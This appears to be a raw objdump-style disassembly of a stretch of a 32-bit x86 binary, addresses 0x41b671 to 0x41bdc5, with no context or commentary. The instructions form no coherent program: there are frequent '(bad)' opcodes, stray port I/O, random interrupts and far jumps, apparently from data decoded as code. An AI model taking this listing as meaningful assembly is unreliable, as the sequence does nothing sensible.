  41b671:	add    al,dh
  41b673:	cmp    al,0x57
  41b675:	dec    esp
  41b676:	mov    dh,0x56
  41b678:	xor    eax,0xaa2dcb3b
  41b67d:	xlat   BYTE PTR ds:[ebx]
  41b67e:	idiv   DWORD PTR [edx-0x4bbb2a9e]
  41b684:	adc    BYTE PTR [edi-0x58],dh
  41b687:	mov    WORD PTR [esp+edi*2-0x39ebe48a],cs
  41b68e:	cs jg  0x41b6f4
  41b691:	rcr    DWORD PTR [ecx+eax*2-0x5c],cl
  41b695:	mov    eax,0x60e13e29
  41b69a:	inc    esi
  41b69b:	inc    ebx
  41b69c:	inc    di
  41b69e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b69f:	sub    al,0xd5
  41b6a1:	dec    ebp
  41b6a2:	lock cmc 
  41b6a4:	idiv   ebp
  41b6a6:	ret    
  41b6a7:	inc    edi
  41b6a8:	or     edx,edx
  41b6aa:	pop    ecx
  41b6ab:	idiv   DWORD PTR [ecx]
  41b6ad:	fldcw  WORD PTR [ecx]
  41b6af:	xor    eax,0xea865675
  41b6b4:	push   ds
  41b6b5:	xor    BYTE PTR [esi-0x3f],cl
  41b6b8:	xor    edx,DWORD PTR [edx]
  41b6ba:	pop    edx
  41b6bb:	test   BYTE PTR es:[edx+0x616d9307],bl
  41b6c2:	dec    ebx
  41b6c3:	sub    DWORD PTR [edi+0x75],edi
  41b6c6:	xchg   edi,eax
  41b6c7:	cs mov esp,0x9168aaad
  41b6cd:	jge    0x41b70e
  41b6cf:	fldcw  WORD PTR [edx+eiz*2-0x1f]
  41b6d3:	jle    0x41b6f3
  41b6d5:	fmul   DWORD PTR [edx]
  41b6d7:	push   edi
  41b6d8:	out    dx,eax
  41b6d9:	dec    esp
  41b6da:	push   edi
  41b6db:	jl     0x41b6ca
  41b6dd:	xor    eax,ecx
  41b6df:	add    eax,esi
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x75e9970a]
  41b6f4:	and    BYTE PTR [ebx],dh
  41b6f6:	fsub   st,st(0)
  41b6f8:	jg     0x41b772
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b71c
  41b6ff:	push   ss
  41b700:	test   edx,edi
  41b702:	inc    edx
  41b703:	std    
  41b704:	xchg   edx,eax
  41b705:	jb     0x41b6c8
  41b707:	and    BYTE PTR [edx-0x1b2a2ece],ch
  41b70d:	out    0xc2,al
  41b70f:	enter  0xfbf6,0xd6
  41b713:	daa    
  41b714:	sbb    al,0xdf
  41b716:	or     ebx,DWORD PTR [eax+0x55]
  41b719:	es mov edi,0xf53eb17b
  41b71f:	enter  0xc2ae,0x99
  41b723:	dec    ecx
  41b724:	jle    0x41b726
  41b726:	xor    DWORD PTR [ebx],0x18
  41b729:	cmp    BYTE PTR [edx],ah
  41b72b:	sti    
  41b72c:	adc    al,0x3b
  41b72e:	and    DWORD PTR [esi-0x1d26239b],ecx
  41b734:	add    eax,0xeb559a30
  41b739:	fisubr WORD PTR [eax*8-0x7b2e972c]
  41b740:	nop
  41b741:	lods   eax,DWORD PTR ds:[esi]
  41b742:	mov    ch,BYTE PTR [ebp+0x72bca566]
  41b748:	pusha  
  41b749:	fadd   DWORD PTR [edx+0x1f]
  41b74c:	add    ch,BYTE PTR [ebp-0x5089b8c2]
  41b752:	push   ebx
  41b753:	sbb    eax,DWORD PTR [ebx+0x6091c890]
  41b759:	jle    0x41b719
  41b75b:	push   ebp
  41b75c:	xor    al,0x10
  41b75e:	in     eax,dx
  41b75f:	dec    esi
  41b760:	jns    0x41b6e2
  41b762:	sar    DWORD PTR [ebp-0x5e9ec727],cl
  41b768:	sbb    dh,dl
  41b76a:	xchg   ebx,eax
  41b76b:	cmp    al,0x3c
  41b76d:	lea    edi,[eax+0x6c5ff8d7]
  41b773:	sub    al,cl
  41b775:	sar    DWORD PTR [ebx],0x7d
  41b778:	inc    esp
  41b779:	js     0x41b7e0
  41b77b:	fcomp  DWORD PTR [edx-0x1c]
  41b77e:	jns    0x5f6c5d89
  41b784:	jp     0x41b7d1
  41b786:	or     ecx,eax
  41b788:	add    edi,DWORD PTR [ecx]
  41b78a:	and    al,0xd9
  41b78c:	push   ss
  41b78d:	ds pop ebx
  41b78f:	repz jno 0x41b7a2
  41b792:	xor    BYTE PTR [eax+0x28],dh
  41b795:	mov    BYTE PTR [edi],ch
  41b797:	sbb    eax,0x49ded7ac
  41b79c:	sub    BYTE PTR [edi+eax*8-0x23],0xa9
  41b7a1:	(bad)  
  41b7a2:	je     0x41b72e
  41b7a4:	mov    dl,0x97
  41b7a6:	mov    WORD PTR [bx+0x3e],fs
  41b7aa:	cwde   
  41b7ab:	or     DWORD PTR [eax+0x69f50591],ebx
  41b7b1:	lods   al,BYTE PTR ds:[esi]
  41b7b2:	pop    ecx
  41b7b3:	mov    ch,BYTE PTR [eax+edx*8-0x25]
  41b7b7:	dec    ebx
  41b7b8:	jmp    0x41b7c4
  41b7ba:	add    eax,0x1fe09511
  41b7bf:	call   0x68fd3e95
  41b7c4:	jno    0x41b79b
  41b7c6:	out    dx,al
  41b7c7:	pushf  
  41b7c8:	aam    0xf2
  41b7ca:	push   ebp
  41b7cb:	mov    ds:0xf31969aa,al
  41b7d0:	pop    eax
  41b7d1:	(bad)  
  41b7d2:	fsubr  QWORD PTR [ecx+edx*2-0x25]
  41b7d6:	scas   al,BYTE PTR es:[edi]
  41b7d7:	test   al,0xde
  41b7d9:	cmp    ecx,DWORD PTR [ebp+0x540b87b8]
  41b7df:	mov    dh,0xda
  41b7e1:	push   esi
  41b7e2:	inc    edx
  41b7e3:	fistp  QWORD PTR [esi]
  41b7e5:	sub    BYTE PTR [ebp-0x5759165e],bh
  41b7eb:	mov    al,0xbf
  41b7ed:	dec    ebx
  41b7ee:	mov    ebp,ebx
  41b7f0:	es fprem 
  41b7f3:	fs loop 0x41b821
  41b7f6:	add    edi,esi
  41b7f8:	dec    ebp
  41b7f9:	dec    esp
  41b7fa:	dec    edx
  41b7fb:	cmp    BYTE PTR [edx+0x21d675ca],0x0
  41b802:	push   esp
  41b803:	mov    esp,0x2598e573
  41b808:	fcmove st,st(3)
  41b80a:	lahf   
  41b80b:	rol    DWORD PTR [esi+eiz*2],0x4d
  41b80f:	hlt    
  41b810:	jmp    0x5deb:0x3e178137
  41b817:	pusha  
  41b818:	clc    
  41b819:	sbb    al,0x4d
  41b81b:	xlat   BYTE PTR ds:[ebx]
  41b81c:	ret    0xb5da
  41b81f:	xchg   esp,eax
  41b820:	mov    edi,0xa5d7c1aa
  41b825:	sahf   
  41b826:	cwde   
  41b827:	pop    es
  41b828:	aas    
  41b829:	dec    ebp
  41b82a:	lahf   
  41b82b:	inc    ecx
  41b82c:	mov    BYTE PTR [ecx+eiz*2-0x65],dl
  41b830:	mov    WORD PTR [ebx-0x7cb24ff8],ds
  41b836:	(bad)  ds:0x3d40d3a3
  41b83c:	jb     0x41b7fb
  41b83e:	mov    ah,0x8b
  41b840:	cmp    BYTE PTR [edi-0x64],0x62
  41b844:	nop
  41b845:	or     ah,dl
  41b847:	xchg   esp,eax
  41b848:	(bad)  
  41b849:	iret   
  41b84a:	lds    ebx,FWORD PTR es:[edi]
  41b84d:	hlt    
  41b84e:	add    esp,DWORD PTR [esi-0x39]
  41b851:	shr    DWORD PTR [edx+0x2f098cbe],cl
  41b857:	shl    BYTE PTR [ebp+0x1dd4e8a8],cl
  41b85d:	cmp    BYTE PTR [edi+0x200be366],dl
  41b863:	aam    0x8d
  41b865:	neg    BYTE PTR [ebx+0x4a838ba1]
  41b86b:	jbe    0x41b876
  41b86d:	cmc    
  41b86e:	add    BYTE PTR [ebp-0x71],bh
  41b871:	inc    edi
  41b872:	push   edx
  41b873:	push   edi
  41b874:	push   ecx
  41b875:	mov    al,ds:0x94fb2df0
  41b87a:	imul   esi,esp,0x75
  41b87d:	jbe    0x41b8ec
  41b87f:	test   DWORD PTR [eax],0x9070ba5
  41b885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b886:	test   DWORD PTR [edx],ebx
  41b888:	hlt    
  41b889:	mov    al,0x80
  41b88b:	inc    ecx
  41b88c:	sar    BYTE PTR [ecx-0x3b],cl
  41b88f:	into   
  41b890:	jbe    0x41b88a
  41b892:	pop    eax
  41b893:	push   0x3a
  41b895:	xchg   BYTE PTR [ecx],cl
  41b897:	and    DWORD PTR [edx-0x16a0839f],edi
  41b89d:	ds in  eax,dx
  41b89f:	(bad)  
  41b8a1:	mov    esi,0x92010021
  41b8a6:	push   edi
  41b8a7:	pop    ds
  41b8a8:	inc    eax
  41b8a9:	leave  
  41b8aa:	cdq    
  41b8ab:	xchg   esi,eax
  41b8ac:	or     al,0xea
  41b8ae:	push   es
  41b8af:	rcr    BYTE PTR [edx-0x36],0xf0
  41b8b3:	jno    0x41b8ef
  41b8b5:	das    
  41b8b6:	add    edx,DWORD PTR [eax+0x34]
  41b8b9:	cs mov edx,0xb6b90f44
  41b8bf:	sub    dh,BYTE PTR [edx-0x5da0086d]
  41b8c5:	adc    al,0x1f
  41b8c7:	jp     0x41b90c
  41b8c9:	mov    ah,0x76
  41b8cb:	(bad)  
  41b8cc:	frstor [edi+edi*1+0x72]
  41b8d0:	cli    
  41b8d1:	retf   0xb74a
  41b8d4:	int    0xe
  41b8d6:	add    al,0x11
  41b8d8:	and    BYTE PTR gs:[ebx-0x641c886f],cl
  41b8df:	xchg   ebp,eax
  41b8e0:	dec    ebp
  41b8e1:	ins    BYTE PTR es:[edi],dx
  41b8e2:	dec    esi
  41b8e3:	jecxz  0x41b8d4
  41b8e5:	dec    edi
  41b8e6:	adc    esi,edx
  41b8e8:	dec    ebp
  41b8e9:	test   DWORD PTR [ecx],ebx
  41b8eb:	and    esp,DWORD PTR [edi-0x454fba4c]
  41b8f1:	pop    esp
  41b8f2:	ins    BYTE PTR es:[edi],dx
  41b8f3:	pop    esi
  41b8f4:	jg     0x41b935
  41b8f6:	xchg   esi,eax
  41b8f7:	daa    
  41b8f8:	xlat   BYTE PTR ds:[ebx]
  41b8f9:	sub    DWORD PTR [ebx*2+0x6b35b127],ebx
  41b900:	and    dl,bh
  41b902:	outs   dx,DWORD PTR ds:[esi]
  41b903:	pop    edx
  41b904:	repnz gs inc eax
  41b907:	(bad)  
  41b908:	cmc    
  41b909:	mov    ds:0xee8240fb,al
  41b90e:	push   edx
  41b90f:	mov    ebx,0xada317cc
  41b914:	or     DWORD PTR [ecx],ebp
  41b916:	imul   eax,DWORD PTR [edx]
  41b919:	mov    edx,DWORD PTR [ebp-0x4]
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx-0x3afadeca]
  41b92f:	pop    ds
  41b930:	mov    eax,esi
  41b932:	out    0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b9a4
  41b93a:	scas   eax,DWORD PTR es:[edi]
  41b93b:	mov    ch,0xb2
  41b93d:	int3   
  41b93e:	inc    ecx
  41b93f:	loopne 0x41b99f
  41b941:	test   al,0xfb
  41b943:	popf   
  41b944:	push   eax
  41b945:	xor    bh,0x29
  41b948:	sub    eax,0x2fae53b1
  41b94d:	xor    al,ch
  41b94f:	fcomip st,st(5)
  41b951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b952:	dec    esi
  41b953:	cmc    
  41b954:	inc    edx
  41b955:	mov    eax,0xacdf7fc2
  41b95a:	scas   al,BYTE PTR es:[edi]
  41b95b:	out    0xf3,eax
  41b95d:	cs mov esi,0x84690a10
  41b963:	xchg   edi,eax
  41b964:	dec    ebx
  41b965:	mov    BYTE PTR cs:[ecx+0x5a759005],ch
  41b96c:	or     dl,0x64
  41b96f:	ja     0x41b9ef
  41b971:	repz inc ebx
  41b973:	into   
  41b974:	xchg   esi,eax
  41b975:	adc    al,0x3b
  41b977:	push   ebx
  41b978:	mov    bl,0x36
  41b97a:	mov    bl,0x98
  41b97c:	int    0xb6
  41b97e:	sbb    dl,ch
  41b980:	lods   eax,DWORD PTR ds:[esi]
  41b981:	pop    edi
  41b982:	jbe    0x41b951
  41b984:	sbb    al,0xf4
  41b986:	add    dh,BYTE PTR [ecx-0x7856ba50]
  41b98c:	(bad)  
  41b98d:	daa    
  41b98e:	dec    esi
  41b98f:	ds push eax
  41b991:	sub    al,0x7d
  41b994:	arpl   dx,di
  41b996:	xor    al,BYTE PTR ss:[ecx-0x5a]
  41b99a:	pop    ebx
  41b99b:	push   esi
  41b99c:	mov    edx,0xfc9f4c0
  41b9a1:	and    ch,BYTE PTR [ebx+0xc]
  41b9a4:	cmp    ebp,DWORD PTR fs:[ebx+0xc74272c]
  41b9ab:	retf   
  41b9ac:	test   al,0xef
  41b9ae:	mov    eax,ds:0x61bfaed9
  41b9b3:	add    al,0x6d
  41b9b5:	imul   esp,esp,0x67
  41b9b8:	lods   eax,DWORD PTR ds:[esi]
  41b9b9:	mov    al,ds:0x49d4d3dc
  41b9be:	test   BYTE PTR [ebx],bh
  41b9c0:	mov    esi,edx
  41b9c2:	daa    
  41b9c3:	and    bl,dh
  41b9c5:	test   dl,dl
  41b9c7:	sbb    dl,al
  41b9c9:	xor    DWORD PTR [eax+0x61],eax
  41b9cc:	xchg   ecx,eax
  41b9cd:	ror    DWORD PTR [edx+0x342e67f9],0x53
  41b9d4:	popa   
  41b9d5:	push   ss
  41b9d6:	das    
  41b9d7:	dec    eax
  41b9d8:	mov    dh,0xc9
  41b9da:	mov    ah,0x75
  41b9dc:	jl     0x41b978
  41b9de:	out    dx,eax
  41b9df:	retf   
  41b9e0:	jbe    0x41ba20
  41b9e2:	dec    edi
  41b9e3:	test   al,0xc2
  41b9e5:	push   ebx
  41b9e6:	fsubr  QWORD PTR ds:0x5660c148
  41b9ec:	xor    ebx,DWORD PTR [ebx*8-0x51b3fe49]
  41b9f3:	push   0xffffffd3
  41b9f5:	(bad)  
  41b9f6:	or     ebp,DWORD PTR [edx-0x6f]
  41b9f9:	lds    esp,FWORD PTR [ecx+ecx*4]
  41b9fc:	outs   dx,BYTE PTR ds:[esi]
  41b9fd:	mov    bh,0x76
  41b9ff:	or     BYTE PTR [ecx-0x18],bl
  41ba02:	sub    BYTE PTR [esi],al
  41ba04:	jno    0x41ba10
  41ba06:	ins    BYTE PTR es:[edi],dx
  41ba07:	and    cl,BYTE PTR [ebx]
  41ba09:	push   esi
  41ba0a:	fcomp  st(7)
  41ba0c:	das    
  41ba0d:	push   esi
  41ba0e:	int3   
  41ba0f:	jle    0x41b9b5
  41ba11:	push   eax
  41ba12:	adc    al,0xb0
  41ba14:	(bad)  
  41ba15:	pop    es
  41ba16:	in     eax,0x9a
  41ba18:	daa    
  41ba19:	jmp    0x6c5d:0xcaec781f
  41ba20:	inc    ebx
  41ba21:	fs cli 
  41ba23:	loop   0x41ba0d
  41ba25:	mov    dl,0x47
  41ba27:	imul   ecx,DWORD PTR ds:0xf79a3be5,0x73069644
  41ba31:	add    eax,0xc961578d
  41ba36:	ror    BYTE PTR [edx+edi*2],cl
  41ba39:	jge    0x41ba67
  41ba3b:	loope  0x41ba7c
  41ba3d:	push   0xc3700a85
  41ba42:	sbb    BYTE PTR [ebx-0x70],dl
  41ba45:	and    BYTE PTR [esi],0x66
  41ba48:	fsubr  st(2),st
  41ba4a:	inc    eax
  41ba4b:	xchg   esi,eax
  41ba4c:	fwait
  41ba4d:	mov    ebp,0xa03c7e67
  41ba52:	push   ecx
  41ba53:	push   ss
  41ba54:	(bad)  
  41ba55:	fcmovnu st,st(0)
  41ba57:	or     al,0xc8
  41ba59:	or     BYTE PTR [edx],0x41
  41ba5c:	or     BYTE PTR [ecx+0x15],cl
  41ba5f:	or     eax,0xaa4e3efe
  41ba64:	pop    ebp
  41ba65:	aas    
  41ba66:	repnz cdq 
  41ba68:	call   0xe7a3:0xb91df059
  41ba6f:	pop    es
  41ba70:	je     0x41ba8d
  41ba72:	ror    DWORD PTR [ebx-0x2f],0x3
  41ba76:	test   eax,0x392ac17
  41ba7b:	in     al,dx
  41ba7c:	mov    bh,0x26
  41ba7e:	int    0xdd
  41ba80:	pop    ss
  41ba81:	shr    DWORD PTR [eax],0x57
  41ba84:	jmp    0x41ba51
  41ba86:	or     al,0x60
  41ba88:	cmc    
  41ba89:	frstor [eax+0x604f6c9a]
  41ba8f:	mov    ds:0xff86828e,al
  41ba94:	lods   eax,DWORD PTR ds:[esi]
  41ba95:	rol    BYTE PTR [ebx+0x74640cb0],0xf5
  41ba9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba9d:	out    0x6a,eax
  41ba9f:	inc    ebp
  41baa0:	mov    ds:0x5e9cac71,eax
  41baa5:	sti    
  41baa6:	inc    esi
  41baa7:	mov    al,0xeb
  41baa9:	lds    esi,FWORD PTR [edi-0x75d5d27c]
  41baaf:	mov    edi,0x363e8bc3
  41bab4:	fsqrt  
  41bab6:	jle    0x41bb2b
  41bab8:	inc    ebx
  41bab9:	lahf   
  41baba:	stc    
  41babb:	and    DWORD PTR [esp+ecx*2-0x4b3dc372],esp
  41bac2:	push   cs
  41bac3:	dec    ebp
  41bac4:	mov    esp,0xd15d0d0d
  41bac9:	push   es
  41baca:	cs add al,0x73
  41bacd:	jb     0x41baa6
  41bacf:	push   esi
  41bad0:	xor    BYTE PTR [edx],al
  41bad2:	test   edi,edx
  41bad4:	fild   DWORD PTR [edx-0x14]
  41bad7:	es je  0x41bb59
  41bada:	je     0x41ba7d
  41badc:	cmp    al,0x5d
  41bade:	jne    0x41baf0
  41bae0:	(bad)  
  41bae1:	mov    dl,0x12
  41bae3:	sub    al,0x6c
  41bae5:	std    
  41bae6:	aas    
  41bae7:	out    dx,al
  41bae8:	jae    0x41bb24
  41baea:	(bad)  
  41baec:	shl    dl,0x88
  41baef:	mov    cl,BYTE PTR [ebx+ebx*8-0x6e]
  41baf3:	stos   DWORD PTR es:[edi],eax
  41baf4:	dec    esp
  41baf5:	std    
  41baf6:	test   eax,0x9959583a
  41bafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bafc:	xlat   BYTE PTR ds:[ebx]
  41bafd:	jmp    0x1701:0xb70d06a0
  41bb04:	jge    0x41bae0
  41bb06:	lock (bad) 
  41bb08:	push   eax
  41bb09:	inc    esp
  41bb0a:	cwde   
  41bb0b:	or     BYTE PTR [ebx-0x51df84d5],bh
  41bb11:	sbb    al,0x33
  41bb13:	and    al,0xe9
  41bb15:	pop    ebx
  41bb16:	repz imul edx,DWORD PTR [ecx+0xe],0xfffffffc
  41bb1b:	xchg   ebx,eax
  41bb1c:	jne    0x41babc
  41bb1e:	push   ss
  41bb1f:	scas   eax,DWORD PTR es:[edi]
  41bb20:	pshufw mm5,mm0,0xf4
  41bb24:	dec    eax
  41bb25:	rcr    edx,0x70
  41bb28:	and    al,BYTE PTR ds:0x7989a0e9
  41bb2e:	ja     0x41bb69
  41bb30:	sub    dl,BYTE PTR [ebp+0x7e]
  41bb33:	and    al,0x15
  41bb35:	lea    ebx,[esp+eax*4+0x1823600b]
  41bb3c:	ror    BYTE PTR [edi-0x78179743],cl
  41bb42:	mov    ds:0x1a23bb7f,al
  41bb47:	test   al,0x75
  41bb49:	push   edx
  41bb4a:	or     eax,0x3306522b
  41bb4f:	mov    eax,ds:0xe9d1337e
  41bb54:	xor    BYTE PTR [edx],al
  41bb56:	add    BYTE PTR [eax],al
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xdf17bf12
  41bb65:	nop
  41bb66:	sahf   
  41bb67:	scas   eax,DWORD PTR es:[edi]
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bb92
  41bb71:	(bad)  [edx+0x50]
  41bb74:	inc    ebp
  41bb75:	in     eax,dx
  41bb76:	mov    ch,0x90
  41bb78:	pop    esp
  41bb79:	pandn  mm3,QWORD PTR [ecx+0x75295f8f]
  41bb80:	pop    es
  41bb81:	jae    0x41bb28
  41bb83:	sbb    al,0xb2
  41bb85:	lock fdiv QWORD PTR [ecx+eiz*8-0x69]
  41bb8a:	fisttp WORD PTR [edi+0x18]
  41bb8d:	int3   
  41bb8e:	out    0xf2,al
  41bb90:	das    
  41bb91:	fist   WORD PTR [ebp+0x9]
  41bb94:	ret    
  41bb95:	(bad)
  41bb98:	in     al,0x6c
  41bb9a:	add    dl,BYTE PTR [ebx-0x4160f101]
  41bba0:	add    dl,BYTE PTR [eax-0x38]
  41bba3:	lds    ecx,FWORD PTR [esi+ecx*1+0x6b]
  41bba7:	jle    0x41bbba
  41bba9:	cli    
  41bbaa:	jl     0x41bba6
  41bbac:	aaa    
  41bbad:	mov    esi,0xe1fa82f8
  41bbb2:	inc    edi
  41bbb3:	mov    bl,0xdb
  41bbb5:	adc    BYTE PTR [edi],dl
  41bbb7:	xlat   BYTE PTR ds:[ebx]
  41bbb8:	or     al,BYTE PTR [ebx-0xbf9450e]
  41bbbe:	pop    ebx
  41bbbf:	(bad)  
  41bbc1:	out    dx,eax
  41bbc2:	pushf  
  41bbc3:	pushf  
  41bbc4:	loope  0x41bbda
  41bbc6:	je     0x41bbf1
  41bbc8:	std    
  41bbc9:	sbb    ah,bl
  41bbcb:	mov    bh,0x62
  41bbcd:	dec    ecx
  41bbce:	(bad)  
  41bbcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbd0:	mov    ebx,0xb6baefd3
  41bbd5:	addr16 mov eax,ds:0xee78
  41bbd9:	xchg   esp,eax
  41bbda:	in     al,0xc3
  41bbdc:	ins    DWORD PTR es:[edi],dx
  41bbdd:	mov    ecx,esp
  41bbdf:	add    bl,BYTE PTR [ecx*1-0x40279740]
  41bbe6:	mov    eax,ds:0x444d462d
  41bbeb:	call   FWORD PTR [ecx]
  41bbed:	int3   
  41bbee:	or     DWORD PTR [esp+edx*8],esi
  41bbf1:	xor    al,0xde
  41bbf3:	scas   eax,DWORD PTR es:[edi]
  41bbf4:	jl     0x41bbd4
  41bbf6:	inc    ecx
  41bbf7:	imul   BYTE PTR [eax-0x42]
  41bbfa:	adc    al,bl
  41bbfc:	cmc    
  41bbfd:	out    dx,al
  41bbfe:	arpl   di,di
  41bc00:	rcl    DWORD PTR [ebp*4+0x70f0310f],1
  41bc07:	and    ebx,0xffffff8f
  41bc0a:	pop    ecx
  41bc0c:	xor    eax,0xd5b83dd7
  41bc11:	ret    0xbdcc
  41bc14:	retf   0x7253
  41bc17:	pop    es
  41bc18:	rcr    BYTE PTR [edi+eiz*1+0x71],1
  41bc1c:	adc    ebx,edi
  41bc1e:	ret    0xe9d2
  41bc21:	and    DWORD PTR [edx+0x5f],esp
  41bc24:	ins    DWORD PTR es:[edi],dx
  41bc25:	ins    BYTE PTR es:[edi],dx
  41bc26:	or     bh,BYTE PTR [edx]
  41bc28:	ret    0xae23
  41bc2b:	ret    0x97ed
  41bc2e:	sub    edx,0x437109fd
  41bc34:	mov    ds:0x54925e20,eax
  41bc39:	dec    ecx
  41bc3a:	xor    al,0x4
  41bc3c:	jb     0x41bbec
  41bc3e:	xchg   esp,eax
  41bc3f:	(bad)  
  41bc40:	adc    DWORD PTR [edx],ebx
  41bc42:	lods   al,BYTE PTR ds:[esi]
  41bc43:	xor    al,0x43
  41bc45:	retf   0xbabf
  41bc48:	sbb    ch,ch
  41bc4a:	and    cl,BYTE PTR [ebx+0x33b840d5]
  41bc50:	push   ebx
  41bc51:	stos   BYTE PTR es:[edi],al
  41bc52:	lahf   
  41bc53:	sti    
  41bc54:	pop    edi
  41bc55:	aas    
  41bc56:	jge    0x41bc36
  41bc58:	push   ds
  41bc59:	gs mov ebx,0xc9641393
  41bc5f:	and    al,0x14
  41bc61:	adc    eax,0xcdcf66af
  41bc66:	lea    edx,[edx+esi*1-0x31]
  41bc6a:	and    ecx,DWORD PTR [eax-0x38298149]
  41bc70:	jle    0x41bc2b
  41bc72:	stos   BYTE PTR es:[edi],al
  41bc73:	aaa    
  41bc74:	ret    0xf2e5
  41bc77:	fimul  WORD PTR [ebp-0x7a]
  41bc7a:	push   es
  41bc7b:	addr16 push cs
  41bc7d:	retf   0x3aa6
  41bc80:	jb     0x41bc19
  41bc82:	ret    0xa3cf
  41bc85:	inc    ecx
  41bc86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc87:	nop
  41bc88:	mov    esi,0x8c06e89
  41bc8d:	fdivr  st(6),st
  41bc8f:	jb     0x41bcc8
  41bc91:	xor    ch,BYTE PTR [ecx+0x5a3f3f21]
  41bc97:	jb     0x41bc30
  41bc99:	repz stc 
  41bc9b:	rol    DWORD PTR ds:0xb150517c,0xf6
  41bca2:	xchg   edi,eax
  41bca3:	xlat   BYTE PTR ds:[ebx]
  41bca4:	push   esi
  41bca5:	pop    ebx
  41bca6:	jno    0x41bcd8
  41bca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bca9:	mov    dl,0x4f
  41bcab:	or     al,0x58
  41bcad:	(bad)  
  41bcaf:	sub    BYTE PTR [ebp+esi*8+0x60f811c7],ch
  41bcb6:	push   ebp
  41bcb7:	lahf   
  41bcb8:	pop    ebp
  41bcb9:	inc    esi
  41bcba:	faddp  st(5),st
  41bcbc:	test   cl,0x83
  41bcbf:	ret    0x4a30
  41bcc2:	lods   eax,DWORD PTR ds:[esi]
  41bcc3:	rol    DWORD PTR [edi-0x5c4d910c],1
  41bcc9:	daa    
  41bcca:	jb     0x41bd49
  41bccc:	fwait
  41bccd:	fwait
  41bcce:	jle    0x41bd29
  41bcd0:	fimul  DWORD PTR [edi]
  41bcd2:	cmp    ecx,esp
  41bcd4:	(bad)  
  41bcd6:	mov    edx,0xfab23fa2
  41bcdb:	leave  
  41bcdc:	jb     0x41bd1c
  41bcde:	cwde   
  41bcdf:	stc    
  41bce0:	dec    edx
  41bce1:	xor    DWORD PTR [ebx-0xf],ecx
  41bce4:	rcr    BYTE PTR [esi+0x62],0x5a
  41bce8:	cmc    
  41bce9:	ds xchg edx,eax
  41bceb:	mov    esi,DWORD PTR [eax+0x0]
  41bcee:	push   0xb20281c6
  41bcf3:	and    DWORD PTR [eax+0x52f5a483],ecx
  41bcf9:	data16 aas 
  41bcfb:	gs (bad) 
  41bcfd:	popf   
  41bcfe:	mov    ds:0xca205ffd,eax
  41bd03:	mov    bl,0x2c
  41bd05:	add    DWORD PTR [edx],ecx
  41bd07:	gs inc esp
  41bd09:	jmp    0xfd215a1a
  41bd0e:	mov    edi,DWORD PTR [ebx-0x74]
  41bd11:	pop    es
  41bd12:	call   0x20bff514
  41bd17:	sahf   
  41bd18:	inc    esp
  41bd19:	test   al,0x43
  41bd1b:	jmp    0x41bcdc
  41bd1d:	and    al,BYTE PTR [edx-0x1267e3e8]
  41bd23:	fisub  WORD PTR [edi-0xc]
  41bd26:	sbb    DWORD PTR [esi],esi
  41bd28:	mov    WORD PTR [ecx+0x24006f7a],gs
  41bd2e:	sti    
  41bd2f:	dec    edx
  41bd30:	pop    ebx
  41bd31:	pop    ebx
  41bd32:	xor    BYTE PTR [ebx],cl
  41bd34:	nop
  41bd35:	push   esp
  41bd36:	xor    bh,bh
  41bd38:	mov    dl,BYTE PTR [esi+ebx*4-0x6f7ddfa4]
  41bd3f:	stos   BYTE PTR es:[edi],al
  41bd40:	repnz sub BYTE PTR [edx+0x3788ec88],bl
  41bd47:	fstp   DWORD PTR [edx]
  41bd49:	adc    eax,0xc7db2386
  41bd4e:	jecxz  0x41bd20
  41bd50:	inc    ecx
  41bd51:	jb     0x41bdb1
  41bd53:	add    dl,BYTE PTR [esi-0x6f75331f]
  41bd59:	(bad)  
  41bd5a:	sub    edi,ecx
  41bd5c:	mov    ecx,0x3ea71d41
  41bd61:	mov    esp,edi
  41bd63:	cld    
  41bd64:	neg    BYTE PTR [edi-0x23f0df23]
  41bd6a:	sub    ch,BYTE PTR [ebp+0x54be019b]
  41bd70:	pop    ebp
  41bd71:	je     0x41bd1f
  41bd73:	adc    DWORD PTR [edi],ecx
  41bd75:	mov    cl,0x3d
  41bd77:	or     eax,0x8a008909
  41bd7c:	hlt    
  41bd7d:	push   ss
  41bd7e:	mov    esi,0x6548e4af
  41bd83:	jle    0x41bd23
  41bd85:	rol    dl,cl
  41bd87:	mov    eax,ds:0xe9084d8b
  41bd8c:	xor    BYTE PTR [edx],al
  41bd8e:	add    BYTE PTR [eax],al
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0x69
  41bd9d:	mov    edx,0xeaa05070
  41bda2:	jg     0x41be1c
  41bda4:	adc    BYTE PTR [esi+0x78],bh
  41bda7:	js     0x41bd81
  41bda9:	pop    ds
  41bdaa:	sub    BYTE PTR ds:[edx+0x40],bh
  41bdae:	loopne 0x41bd59
  41bdb0:	nop
  41bdb1:	jecxz  0x41be11
  41bdb3:	xor    ebx,DWORD PTR [ebx-0x6557ff38]
  41bdb9:	enter  0x6aa7,0xf2
  41bdbd:	sub    al,0x93
  41bdbf:	bound  edi,QWORD PTR [ecx+0x1307b3b7]
  41bdc5:	fmul   st,st(4)
